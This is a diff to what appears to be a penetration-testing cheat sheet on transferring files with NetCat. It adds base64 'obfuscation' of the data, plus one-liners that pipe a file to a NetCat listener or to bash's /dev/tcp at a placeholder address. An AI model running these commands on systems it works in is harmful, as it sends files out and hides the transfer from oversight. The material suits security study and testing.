@@ -63,7 +63,29 @@ nc -q 0 %ListenerAddress% %ListeningPort% < file.ext
 cat file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
 ```
 
+##### If you want to obfuscate the data being transfered by converting it to a base64 string:
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
+
+```
+nc -lp %ListeningPort% | base64 -d > file.ext
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; On the Linux client connect back with NetCat:
+
+```
+base64 -w0 file.ext | nc -q 0 %ListenerAddress% %ListeningPort%
+```
+
+###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; If NetCat is unavailable, on the Linux client connect back with bash:
+
+```
+base64 -w0 file.ext >& /dev/tcp/%ListenerAddress%/%ListenerPort%
+```
+
 #### Retrieve file from host to client:
+
+##### If you want to send the raw contents:
 
 ###### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Setup NetCat listener on Linux host:
 
